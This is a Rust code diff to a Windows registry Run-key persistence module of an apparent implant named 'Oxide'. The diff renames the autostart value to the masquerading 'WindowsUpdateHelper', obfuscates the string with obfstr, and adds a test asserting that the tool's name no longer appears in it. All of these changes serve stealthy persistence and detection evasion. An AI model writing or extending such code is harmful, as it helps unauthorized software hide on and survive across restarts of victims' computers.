@@ -2,7 +2,6 @@ use crate::persistence::PersistenceTrait;
 use std::path::Path;
 
 pub struct RegistryRunPersistence;
-const VALUE_NAME: &str = "OxideSystemUpdate";
 const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
 
 #[cfg(target_os = "windows")]
@@ -14,7 +13,7 @@ impl PersistenceTrait for RegistryRunPersistence {
         let s = binary_path
             .to_str()
             .ok_or_else(|| anyhow::anyhow!("invalid path"))?;
-        run.set_value(VALUE_NAME, &s)?;
+        run.set_value(obfstr::obfstr!("WindowsUpdateHelper"), &s)?;
         Ok(())
     }
     fn remove(&self) -> anyhow::Result<()> {
@@ -22,7 +21,7 @@ impl PersistenceTrait for RegistryRunPersistence {
         use winreg::RegKey;
         RegKey::predef(HKEY_CURRENT_USER)
             .open_subkey_with_flags(RUN_KEY, KEY_WRITE)?
-            .delete_value(VALUE_NAME)?;
+            .delete_value(obfstr::obfstr!("WindowsUpdateHelper"))?;
         Ok(())
     }
     fn check(&self) -> bool {
@@ -30,7 +29,7 @@ impl PersistenceTrait for RegistryRunPersistence {
         use winreg::RegKey;
         RegKey::predef(HKEY_CURRENT_USER)
             .open_subkey(RUN_KEY)
-            .and_then(|k| k.get_value::<String, _>(VALUE_NAME))
+            .and_then(|k| k.get_value::<String, _>(obfstr::obfstr!("WindowsUpdateHelper")))
             .is_ok()
     }
     fn name(&self) -> &'static str {
@@ -58,8 +57,11 @@ impl PersistenceTrait for RegistryRunPersistence {
 mod tests {
     use super::*;
     #[test]
-    fn value_name_stable() {
-        assert_eq!(VALUE_NAME, "OxideSystemUpdate");
+    fn registry_value_name_is_generic() {
+        let name = obfstr::obfstr!("WindowsUpdateHelper");
+        assert!(!name.contains("Oxide"));
+        assert!(!name.contains("oxide"));
+        assert!(!name.is_empty());
     }
     #[test]
     fn run_key_correct() {
